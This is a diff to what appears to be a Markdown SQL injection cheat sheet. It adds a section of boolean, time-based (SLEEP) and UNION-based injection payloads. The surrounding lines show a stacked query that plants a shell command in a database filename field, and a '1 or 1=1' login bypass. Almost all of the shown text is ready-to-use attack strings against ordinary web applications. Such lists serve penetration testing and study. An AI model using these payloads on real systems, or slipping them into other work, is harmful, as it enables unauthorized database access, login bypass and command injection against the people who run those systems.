@@ -43,6 +43,13 @@ xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
 id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; >> To manipulate database filename.
 
 ```
+### Exceptional
+```txt
+-1047 OR CASE WHEN 6810=6810 THEN 6810 ELSE JSON(CHAR(98,79,78,79)) END
+%' AND 7395=7395 AND 'gyZA%'='gyZA
+%' AND (SELECT 9598 FROM (SELECT(SLEEP(5)))bJqR) AND 'FKXA%'='FKXA
+%' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b7a7a71,0x6a4a7143494e46596b6d4c4c6569725a475572687178746d55434b687861796371705952614c7857,0x7176786271),NULL-- -
+```
 ### Determinig SQLi Vulnerablity & Login Bypass
 ```sql
 1 or 1=1-- -
